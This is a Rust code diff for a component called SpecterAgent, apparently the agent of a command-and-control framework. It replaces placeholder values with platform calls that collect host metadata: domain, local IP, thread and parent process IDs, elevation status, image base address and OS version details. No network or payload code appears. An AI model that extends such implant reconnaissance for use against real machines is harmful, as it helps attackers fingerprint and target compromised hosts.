@@ -59,21 +59,21 @@ impl SpecterAgent {
         AgentMetadata {
             hostname: hostname(),
             username: username(),
-            domain_name: String::from("WORKGROUP"),
+            domain_name: domain_name(),
             internal_ip: local_ip(),
             process_path: std::env::current_exe()
                 .map(|p| p.display().to_string())
                 .unwrap_or_default(),
             process_pid: std::process::id(),
-            process_tid: 0,
-            process_ppid: 0,
+            process_tid: process_tid(),
+            process_ppid: process_ppid(),
             process_arch: if cfg!(target_arch = "x86_64") { 2 } else { 1 },
-            elevated: false,
-            base_address: 0,
+            elevated: is_elevated(),
+            base_address: base_address(),
             os_major: os_major(),
-            os_minor: 0,
+            os_minor: os_minor(),
             os_product_type: 1,
-            os_service_pack: 0,
+            os_service_pack: u32::from(os_service_pack()),
             os_build: os_build(),
             os_arch: if cfg!(target_arch = "x86_64") { 9 } else { 0 },
             sleep_delay: self.config.sleep_delay_ms,
@@ -319,25 +319,54 @@ fn username() -> String {
     crate::platform::username()
 }
 
-/// Get a local IP address (best effort).
-fn local_ip() -> String {
-    String::from("127.0.0.1")
+/// Get the domain name (or "WORKGROUP") via platform-native API.
+fn domain_name() -> String {
+    crate::platform::domain_name()
 }
 
-/// Get the OS major version.
-///
-/// On Windows this calls `RtlGetVersion` via the platform module.
-/// On other platforms returns 0 (scaffold placeholder).
+/// Get the local IP address via the OS routing table.
+fn local_ip() -> String {
+    crate::platform::local_ip()
+}
+
+/// Get the current thread ID via platform-native API.
+fn process_tid() -> u32 {
+    crate::platform::process_tid()
+}
+
+/// Get the parent process ID via platform-native API.
+fn process_ppid() -> u32 {
+    crate::platform::process_ppid()
+}
+
+/// Return whether the current process is running elevated via platform-native API.
+fn is_elevated() -> bool {
+    crate::platform::is_elevated()
+}
+
+/// Get the base address of the current process image via platform-native API.
+fn base_address() -> u64 {
+    crate::platform::base_address()
+}
+
+/// Get the OS major version via `RtlGetVersion` (Windows) or returns 0 elsewhere.
 fn os_major() -> u32 {
     crate::platform::os_version().0
 }
 
-/// Get the OS build number.
-///
-/// On Windows this calls `RtlGetVersion` via the platform module.
-/// On other platforms returns 0 (scaffold placeholder).
+/// Get the OS minor version via `RtlGetVersion` (Windows) or returns 0 elsewhere.
+fn os_minor() -> u32 {
+    crate::platform::os_version().1
+}
+
+/// Get the OS build number via `RtlGetVersion` (Windows) or returns 0 elsewhere.
 fn os_build() -> u32 {
     crate::platform::os_version().2
+}
+
+/// Get the OS service pack major version via `RtlGetVersion` (Windows) or returns 0 elsewhere.
+fn os_service_pack() -> u16 {
+    crate::platform::os_version().3
 }
 
 #[cfg(test)]
